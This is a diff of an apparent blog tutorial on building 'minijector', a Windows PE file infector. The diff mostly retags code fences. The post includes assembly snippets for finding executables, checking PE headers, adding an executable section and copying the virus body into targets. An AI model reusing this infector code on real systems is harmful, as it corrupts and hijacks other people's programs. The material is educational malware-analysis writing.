@@ -35,7 +35,7 @@ One of the classic problems of virus development is making sure that your creati
 
 This simple infection strategy makes development easier. For example I wrote my [`Makefile`'s `run` target](https://github.com/cpu/vexation/blob/63dd691b18b26f56381b53878a2f1fa29bb047a7/minijector/Makefile#L46-L49) to copy a clean `calc.exe` from `C:\Windows` into the current directory before running the generation zero program, overwriting any previously infected versions in the process. I know the infection won't spread beyond the working directory and so everything is neatly contained.
 
-```
+```makefile{numberLines:true}
 run:: $(NAME).EXE
    del CALC.EXE
    copy C:\WINDOWS\CALC.EXE
@@ -50,7 +50,7 @@ To keep things simple I have been limiting my code to ASCII compatibility which 
 
 To find files in the current directory requires using a combination of [`FindFirstFileA`](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findfirstfilea) and [`FindNextFileA`](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findnextfilea). The first is used to start a directory traversal and the second is used to continue it. By providing a pointer to the null terminated string `"*.exe"` as the `lpFileName` I'm able to start a traversal of all executables (if any!) in the current directory.
 
-```
+```nasm{numberLines:true}
 findfirst:
   mov eax, offset infectFilter
   mov ebx, offset findData
@@ -127,7 +127,7 @@ There are two paths forward to read and write data from the file handle. Either 
 
 Memory mapping requires calling [`CreateFileMappingA`](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createfilemappinga) using the file handle from `CreateFileA` to get yet another handle, this time to a file mapping object. I was able to use the file mapping object handle with `MapViewOfFile` to map a specified portion of the underlying file into memory. The return value from this function is a pointer to the region of memory the file was mapped and it's possible to read and write from this region to access and change the file's contents.
 
-```
+```nasm{numberLines:true}
 mapfile:
   ; Open a file handle to the targetFile. Use READ + WRITE so we can modify the
   ; file easily if it turns out to be infectable.
@@ -183,7 +183,7 @@ mapfile:
 
 With the file memory mapped it's possible to check whether it can be infected by examining key offsets within the DOS and PE headers. Initially when I was looking at example PE infector source code from this era I found most were using numeric offsets as magic numbers throughout the code. For example, here's one snippet I found that copies the file and section alignment from a PE header using numeric offsets:
 
-```
+```nasm{numberLines:true}
 ;falignvalue will contain the FileAlignment
 ;and salignvalue will contain the SectionAlignment
 mov eax, [ebx + 3Ch]
@@ -197,7 +197,7 @@ read.
 
 Life was much easier when I used my assembler's ability to define structures. TASM/MASM both support the `STRUCT` keyword for this. If there was a `STRUCT` for the PE header and its optional header then the section and file alignment fields could be accessed without using numeric offsets like `0x3C` and `0x38`:
 
-```
+```nasm{numberLines:true}
 ;falignvalue will contain the FileAlignment
 ;and salignvalue will contain the SectionAlignment
 mov eax, (IMAGE_NT_HEADERS [ebx]).OptionalHeader.FileAlignment
@@ -219,7 +219,7 @@ For this project I needed to check each target file for following things to deci
 1. There shouldn't be an `IMAGE_SECTION_HEADER` present with the same name as the    virus code section (or it's already infected).
 1. There should be enough space for an additional `IMAGE_SECTION_HEADER` to be    added.
 
-```
+```nasm{numberLines:true}
 ; With the target EXE mapped into memory we can start checking it out
 @@checkdosheader:
   ; Check that we have a DOS header by looking for the IMAGE_DOS_SIGNATURE
@@ -288,7 +288,7 @@ At a high level adding a new section means:
 
 Increasing the `NumberOfSections` is self explanatory. Finding the end of the `IMAGE_SECTION_HEADERS` array requires some math. The start of this array is always immediately after the end of the base PE `IMAGE_NT_HEADERS` structure. I knew where the start of the PE structure is (the `e_lfanew` pointer from the `IMAGE_DOS_HEADER`) and I knew the size of the `IMAGE_NT_HEADERS` structure. That gives me the end of the PE structure and the start of the `IMAGE_SECTION_HEADER` array. I can calculate the offset to the end of the array as the number of sections (`NumberOfSections`) multiplied by the size of each `IMAGE_SECTION_HEADER` structure.
 
-```
+```nasm{numberLines:true}
   ; Copy down how many sections the target PE has
   mov cx, (IMAGE_NT_HEADERS [eax]).FileHeader.NumberOfSections
   movzx ecx, cx
@@ -343,7 +343,7 @@ Calculating the right virtual size and raw data size required knowing the origin
 
 By placing a label (`viral_payload`) at the very start of the virus code I could use the location counter symbol (`$`) in an equate that will provide an accurate size constant (`viral_payload_size`) for the rest of the code to use:
 
-```
+```nasm
 viral_payload_size EQU $ - viral_payload
 ```
 
@@ -351,20 +351,20 @@ This equate stayed current as I tweaked the code and avoided having to update a 
 
 Aligning the virtual and raw sections according to the required alignment sounds difficult but is just a way of saying that the unaligned size must be made evenly divisible by the alignment value. The calculation is:
 
-```
+```nasm
 (((originalSize - 1) / alignment) + 1) * alignment
 ```
 
 A typical value for the PE optional header section alignment is `0x1000`, so the adjusted `VirtualSize` of the new section assuming the `viral_payload_size` is `0x38E` is:
 
-```
+```nasm
 VirtualSize = (((0x38E - 0x1) / 0x1000) + 0x1) * 0x1000 
             = 0x1000 = 4096
 ```
 
 For the `SizeOfRawData` a typical file alignment value is `0x200`, so the calculation is:
 
-```
+```nasm
 SizeOfRawData = (((0x38E - 0x1) / 0x200) + 0x1) * 0x200 
               = 0x400 = 1024
 ```
@@ -377,7 +377,7 @@ Similar to the `SecHdrVirtualAddress`, the `PointerToRawData` value is an RVA th
 
 The last part was setting the `SecHdrCharacteristics` flag. The new section contains code and should be executable and readable. In the future I know I'll want the virus code to be able to modify parts of its own section so I also wanted the section to be writable. All told this meant the flag value was the combination of the `IMAGE_SCN_MEM_READ`, `IMAGE_SCN_MEM_WRITE`, `IMAGE_SCN_MEM_EXECUTE` and `IMAGE_SCN_CNT_CODE` bitmasks.
 
-```
+```nasm{numberLines:true}
   ; Fix the VirtualSize, ensuring its a multiple of the section alignment
   mov eax, viral_payload_size
   sub eax, 1
@@ -445,7 +445,7 @@ The last trick I needed to perform is to expand the target's overall file size. 
 
 Increasing the file size turns out to be pretty easy and only required remaping the file using `CreateFileMappingA` and `MapViewOfFile` again, adjusting the arguments to account for the new space. Because I'm modifying a PE file on disk I need to adjust by the new section's `SizeOfRawData` not the original unpadded size or the `VirtualSize`.
 
-```
+```nasm{numberLines:true}
   ; Calculate the new size we should map. This is the old file size + 
   ; the size of the new section on-disk
   mov eax, [targetFileSize]
@@ -469,8 +469,7 @@ Increasing the file size turns out to be pretty easy and only required remaping 
 
 After the enlarged view of the file is mapped it was just a matter of copying the generation 0 code that is currently executing from memory into the new section. For this I used a fun bit of self-referential code that relies on the `viral_payload` label and the new `SizeOfRawData` to know where to begin copying from and how many bytes to copy.
 
-```
-
+```nasm{numberLines:true}
 ; Time to write the new section content with our own code
 @@startcopyviruscode:
   ; Destination: the start of our section in targetP
@@ -485,7 +484,7 @@ After the enlarged view of the file is mapped it was just a matter of copying th
   rep movsb
 ```
 
-# Assembly code
+# Complete Assembly code
 
 The code that implements all of the above is available in the [VeXation Github
 repo](https://github.com/cpu/vexation) under [the `minijector` folder](https://github.com/cpu/vexation/tree/master/minijector). "Mini" because it isn't a finished virus, "jector" because saying "injector" over and over was driving me batty.
